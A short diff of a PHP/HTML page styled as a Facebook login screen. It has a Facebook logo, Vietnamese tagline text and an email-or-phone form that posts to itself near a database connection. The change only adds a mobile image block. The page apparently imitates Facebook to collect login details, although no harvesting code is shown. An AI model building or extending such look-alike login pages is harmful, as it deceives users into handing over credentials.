@@ -55,6 +55,9 @@ $connect->close();
           <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
           <p>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
         </div>
+        <div class="mobile-img">
+          <img src="./img/favicon.png" alt="">
+        </div>
         <div class="form-box">
           <form action="" method="post">
             <input type="text" name="email" placeholder="Email hoặc số điện thoại">
